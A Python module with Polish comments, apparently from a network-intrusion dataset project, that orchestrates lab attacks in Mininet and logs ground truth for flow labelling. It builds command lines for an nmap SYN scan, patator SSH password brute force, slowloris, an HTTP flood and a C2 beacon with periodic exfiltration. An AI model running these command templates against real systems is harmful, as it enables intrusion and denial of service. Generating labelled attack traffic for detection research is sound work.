#!/usr/bin/env python3
"""Orkiestrator ataków: odpala scenariusze A1-A4 i Z1 w mininecie i zapisuje
prawdę o atakach (ground truth) do ground_truth.jsonl

Jak to działa:
  - scenariusze są w attacks/scenarios/*.yaml (co, kto, czym, jak mocno);
  - load_specs() je wczytuje, a RUNNERS[tool] składa polecenie konkretnego narzędzia
    (nmap, patator, slowhttptest, http_flood, beacon_client) i odpala je
    w przestrzeni nazw atakującego hosta
  - run_attack() mierzy okno [start, end] i dopisuje rekord do ground_truth.jsonl: atakujący,
    cele, typ, MITRE, narzędzie, parametry, ścieżka logu narzędzia.
    Ten plik jest wejściem do etykietowania (label_flows.py) i do niezależnej kontroli
    (check_labels.py przez tool_logs.py)

Ten moduł jest biblioteką: features/run_session.py importuje go i wg własnego harmonogramu
sesji woła load_specs() oraz run_attack() dla pojedynczych wystąpień ataków.

"""
import glob
import json
import os
import re
import sys
import time

import yaml

ENV = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "env"))
sys.path.insert(0, ENV)

import topology  # noqa: E402

ATTACKS_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(ATTACKS_DIR, "tools")
# Limit czasu jednego narzędzia [s]: najdłuższy atak (Z1) to ok. 405 s samych odstępów plus czas żądań
# (do 5 s każde przy wolnym C2), w M1-M6 199-345 s;
# zawieszone narzędzie
# (np. patator na przeciążonym sshd) nie może wydłużyć okna ataku w ground truth bez końca.
# Przekroczenie limitu daje kod wyjścia 124 (timeout), a 137, gdy narzędzie dostało SIGKILL po -k 10;
# kod trafia do ground truth i na ekran.
TOOL_TIMEOUT_S = 900


# Pobierz adres IP hosta z centralnej konfiguracji topologii.
def resolve_ip(name):
    if name not in topology.HOSTS:
        raise KeyError(f"nieznany host: {name}")
    return topology.HOSTS[name][1]


# Wczytaj scenariusze YAML i opcjonalnie wybierz tylko wskazane nazwy. Każdy scenariusz jest
# sprawdzany przed startem sieci (validate_spec), a nieznana nazwa w only kończy program błędem,
# żeby literówka nie dała po cichu sesji bez ataków.
def load_specs(scenarios_dir, only=None):
    specs = []
    for path in sorted(glob.glob(os.path.join(scenarios_dir, "*.yaml"))):
        with open(path) as f:
            # safe_load buduje tylko zwykłe typy (dict/list/str/int) i nie wykona kodu
            # ukrytego w YAML-u (inaczej niż yaml.load) - bezpieczny domyślny wybór.
            spec = yaml.safe_load(f)
        validate_spec(spec, path)
        if only and spec["name"] not in only:
            continue
        specs.append(spec)
    if only:
        unknown = set(only) - {spec["name"] for spec in specs}
        if unknown:
            raise ValueError(f"nieznane scenariusze: {sorted(unknown)} (dostępne w {scenarios_dir})")
    return specs


# A1: nmap SYN-scan portów serwerów; wynik w logu -oN (czyta go tool_logs.nmap_open_ports)
def run_nmap(host, spec, target_ips, log):
    params = spec["params"]
    cmd = (f"nmap {params['scan_flags']} {params.get('timing', '')} {params.get('extra', '')} "
           f"-p {params['ports']} -oN '{log}' {' '.join(target_ips)}")
    return run_tool(host, cmd)


# A2: patator zgaduje hasło SSH z listy; log z próbami czyta tool_logs.patator_attempts
def run_patator(host, spec, target_ips, log):
    params = spec["params"]
    wordlist = os.path.join(ATTACKS_DIR, params["wordlist"])  # pełna ścieżka do listy haseł
    target = target_ips[0]                                    # brute-force SSH ma jeden cel
    # Bez filtra -x: w logu zostają wszystkie próby (udane i nieudane) - to materiał do etykiet.
    # Opcje globalne w formie --opcja=wartość (patator przyjmuje też wartość po spacji, tak jest czytelniej).
    # --rate-limit to przerwa przed każdą próbą w każdym wątku osobno (4 wątki co 0,3 s = ok. 13 prób/s).
    cmd = (f"patator ssh_login host={target} port=22 user={params['user']} "
           f"password=FILE0 0='{wordlist}' persistent=0 "
           f"--threads={params.get('threads', 4)} --rate-limit={params.get('rate_limit_s', 0.3)} "
           f"> '{log}' 2>&1")
    return run_tool(host, cmd)


# A3: slowloris - wiele połączeń podtrzymywanych niedokończonymi nagłówkami, aż wyczerpią pulę
def run_slowhttptest(host, spec, target_ips, log):
    params = spec["params"]
    target = target_ips[0]
    cmd = (f"slowhttptest {params['mode']} -c {params['connections']} -r {params['rate']} "
           f"-i {params['interval']} -l {params['duration']} -t GET -u http://{target}/ > '{log}' 2>&1")
    return run_tool(host, cmd)


# A4: nasz http_flood.py - zalew krótkich żądań GET do serwera web
def run_http_flood(host, spec, target_ips, log):
    params = spec["params"]
    cmd = (f"python3 '{TOOLS_DIR}/http_flood.py' --target {target_ips[0]} "
           f"--duration {params['duration']} --threads {params['threads']} "
           f"--rps {params['rps']} --seed {params.get('seed', 0)} --log '{log}'")
    return run_tool(host, cmd)


# Z1: nasz beacon_client.py - regularne check-iny do C2 + okresowa eksfiltracja
def run_beacon(host, spec, target_ips, log):
    params = spec["params"]
    cmd = (f"python3 '{TOOLS_DIR}/beacon_client.py' --target {target_ips[0]} "
           f"--count {params['count']} --interval {params['interval']} --jitter {params['jitter']} "
           f"--exfil-every {params.get('exfil_every', 0)} --exfil-bytes {params.get('exfil_bytes', 4096)} "
           f"--seed {params.get('seed', 0)} --log '{log}'")
    return run_tool(host, cmd)


# Uruchamia polecenie w przestrzeni nazw hosta (z limitem TOOL_TIMEOUT_S) i zwraca kod wyjścia narzędzia
# (host.cmd zwraca tylko tekst, więc kod dopisuję na końcu wyjścia); None, gdy nie da się go odczytać.
# Każde polecenie to jedno narzędzie z ewentualnym przekierowaniem wyjścia, więc timeout obejmuje całość.
def run_tool(host, cmd):
    # -k 10: gdy narzędzie zignoruje SIGTERM, po 10 s dostaje SIGKILL
    output = host.cmd(f"timeout -k 10 {TOOL_TIMEOUT_S} {cmd}; echo __exit_code=$?")
    match = re.search(r"__exit_code=(\d+)", output)
    return int(match.group(1)) if match else None


RUNNERS = {"nmap": run_nmap, "patator": run_patator, "slowhttptest": run_slowhttptest,
           "http_flood": run_http_flood, "beacon": run_beacon}

# Jakie parametry przyjmuje każde narzędzie: wymagane i opcjonalne (z wartością domyślną w run_*).
TOOL_PARAMS = {
    "nmap": ({"scan_flags", "ports"}, {"timing", "extra"}),
    "patator": ({"user", "wordlist"}, {"threads", "rate_limit_s"}),
    "slowhttptest": ({"mode", "connections", "rate", "interval", "duration"}, set()),
    "http_flood": ({"duration", "threads", "rps"}, {"seed"}),
    "beacon": ({"count", "interval", "jitter"}, {"exfil_every", "exfil_bytes", "seed"}),
}
ATTACK_TYPES = {"port_scan", "ssh_bruteforce", "dos_slow", "http_flood", "c2_beaconing"}
SPEC_KEYS = ("name", "type", "mitre", "attacker", "targets", "tool", "params")


# Sprawdza scenariusz przed startem sieci: komplet kluczy, znane narzędzie i typ ataku, znane hosty
# i parametry. Literówka w nazwie parametru opcjonalnego dałaby inaczej po cichu wartość domyślną.
def validate_spec(spec, path):
    missing_keys = [key for key in SPEC_KEYS if key not in spec]
    if missing_keys:
        raise ValueError(f"{path}: brak kluczy {missing_keys}")
    if spec["tool"] not in TOOL_PARAMS:
        raise ValueError(f"{path}: nieznane narzędzie {spec['tool']!r} (znane: {sorted(TOOL_PARAMS)})")
    if spec["type"] not in ATTACK_TYPES:
        raise ValueError(f"{path}: nieznany typ ataku {spec['type']!r} (znane: {sorted(ATTACK_TYPES)})")
    for host in list(spec["targets"]) + [spec["attacker"]]:
        resolve_ip(host)
    required, optional = TOOL_PARAMS[spec["tool"]]
    given = set(spec["params"])
    if required - given:
        raise ValueError(f"{path}: brak parametrów {sorted(required - given)}")
    if given - required - optional:
        raise ValueError(f"{path}: nieznane parametry {sorted(given - required - optional)}")


# Uruchamia jeden atak z hosta attacker_name i dopisuje jego rekord do ground_truth.jsonl (okno
# [start, end] + parametry). Wołany przez features/run_session.py wg harmonogramu sesji; atakującego
# wybiera run_session.pick_attacker (rotacja hostów wewnętrznych).
def run_attack(net, spec, out, attacker_name):
    host = net.get(attacker_name)
    attacker_ip = resolve_ip(attacker_name)
    target_ips = [resolve_ip(t) for t in spec["targets"]]
    log = os.path.join(out, f"{spec['name']}.log")

    start = time.time()
    exit_code = RUNNERS[spec["tool"]](host, spec, target_ips, log)
    end = time.time()
    # rekord zapisuję także przy błędzie narzędzia: check_labels porówna przepływy z logiem narzędzia,
    # a kod wyjścia w ground truth pokazuje, które wystąpienie trzeba obejrzeć.
    # Przy Ctrl+C albo wyjątku w trakcie narzędzia rekordu nie ma; run_session kończy się wtedy kodem
    # różnym od 0 i record_all.sh odrzuca całą sesję
    if exit_code != 0:
        print(f"  UWAGA: {spec['name']} ({spec['tool']}) zakończył się kodem {exit_code}, log: {log}")

    record = {
        "attack_id": spec["name"], "type": spec["type"], "mitre": spec["mitre"],
        "attacker": attacker_name, "attacker_ip": attacker_ip,
        "targets": spec["targets"], "target_ips": target_ips,
        "start": round(start, 3), "end": round(end, 3), "duration_s": round(end - start, 2),
        "tool": spec["tool"], "params": spec["params"],
        "tool_log": log, "exit_code": exit_code,
    }
    with open(os.path.join(out, "ground_truth.jsonl"), "a") as f:
        f.write(json.dumps(record) + "\n")
    return record
